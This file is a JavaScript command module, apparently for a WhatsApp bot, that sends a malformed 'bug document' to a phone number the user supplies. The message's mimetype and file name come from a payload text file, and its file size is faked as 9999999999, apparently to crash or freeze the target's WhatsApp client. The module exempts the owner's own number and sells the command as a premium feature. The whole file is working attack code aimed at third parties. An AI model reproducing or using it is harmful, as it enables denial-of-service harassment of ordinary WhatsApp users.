let fs = require('fs')
doctext = fs.readFileSync('./src/doctext.txt')

let handler = async(m, { conn, usedPrefix, command, text }) => {
    let nomornya = text.replace(/[^0-9]/g, '')
    if (!text) { throw `Masukkan nomor target\n\nContoh: ${usedPrefix + command} 62857xxx`
    } else if (nomornya.includes('6285752765133')) {
        throw `ITU NOMOR OWNER BANH😅`
    } else {
    conn.sendMessage(nomornya + '@s.whatsapp.net', { document: fs.readFileSync('./src/menu.jpg'), mimetype: `${doctext}`, fileName: `${doctext}.pdf`, fileLength: 9999999999, })
    m.reply(`Sukses mengirim bugdocument ke nomor ${text}`)
    }
}
handler.command = /^(bugdocpc|bugdocumentpc)$/i
handler.premium = true
handler.tags = ['premium']
handler.help = ['bugdocpc']

module.exports = handler